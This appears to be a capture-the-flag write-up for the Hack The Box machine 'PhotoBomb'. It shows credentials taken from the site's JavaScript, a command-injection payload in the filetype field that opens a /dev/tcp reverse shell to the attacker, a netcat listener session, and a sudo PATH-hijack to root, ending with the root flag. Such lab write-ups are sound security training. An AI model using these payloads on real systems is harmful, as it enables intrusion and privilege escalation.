---
title: "PhotoBomb from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# PhotoBomb from HTB
add this to `/etc/hosts`
```
10.10.11.182 photobomb.htb
```
Then access the site.
Click the only link there is and it will ask for `password and username`.
To find it click `CTRL+U`and then go to `js`file. There you will find `password and username`:
```bash
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
```
`pH0t0:b0Mb!`here it is.
Now click `link`and log in.
Turn on `BurpSuite + Intercept`and then choose photo and click download.
Modify the request in `BurpSuite`like this to get `reverse shell`:
```bash
photo=nathaniel-worrell-zK_az6W3xIo-unsplash.jpg&filetype=jpg;bash+-c+'sh+-i+>%26/dev/tcp/<your_ip>/<port> +0>%261';&dimensions=600x400
```
`Turn on netcat listener`and then wait for connection.
```bash
rlwrap nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.182] 56000
sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
Read what the code does and then we get that it resets `enviroment`and set a new one.
Then create an file, name whatever you want and use this commands:
```bash
echo '/bin/bash' > /tmp/help
chmod +x /tmp/help
sudo PATH=/tmp:$PATH /opt/cleanup.sh
root@photobomb:/tmp#
```
You are root now.
***
Root Flag is: c2586fb0adc030681ba4833377607789
***
![](/assets/images/Screenshot from 2024-08-14 17-11-15.png)
